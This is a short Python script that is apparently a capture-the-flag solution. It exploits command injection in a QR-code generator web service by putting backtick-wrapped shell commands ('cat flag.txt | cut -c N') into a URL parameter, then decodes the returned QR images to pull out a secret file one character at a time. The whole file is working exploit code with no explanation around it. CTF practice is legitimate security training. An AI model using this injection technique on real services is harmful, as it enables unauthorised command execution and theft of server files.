import shutil
import requests
import qrtools
qr = qrtools.QR()

url = 'http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`cat flag.txt | cut -c '
ans = []
for i in range(1, 50):
  q = str(i) + '`'
  response = requests.get(url+q, stream=True)
  with open('img.png', 'wb') as out_file:
      shutil.copyfileobj(response.raw, out_file)
  del response
  qr.decode("img.png")
  print qr.data
  ans.append(qr.data)
  if qr.data == '}':
    break
print "".join(ans)